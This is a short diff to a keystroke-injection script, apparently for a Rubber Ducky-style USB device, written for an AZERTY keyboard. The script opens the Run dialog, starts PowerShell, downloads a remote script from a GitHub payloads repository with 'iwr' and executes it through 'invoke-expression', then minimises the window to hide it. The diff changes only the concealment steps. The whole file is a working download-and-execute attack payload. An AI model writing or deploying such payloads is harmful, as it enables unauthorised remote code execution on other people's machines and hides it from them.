@@ -1,9 +1,8 @@
 LAYOUT AZERTY
 GBDELAY 500
-CTRL GUI D
 GUI R
 STRINGLN powershell
 DELAY 1500
 STRINGLN $pl = iwr https://raw.githubusercontent.com/Red-Ducky/Payloads/main/Popups/payload.ps1; invoke-expression $pl
 STRINGLN O
-CTRL GUI LEFT
+ALT SPACE N
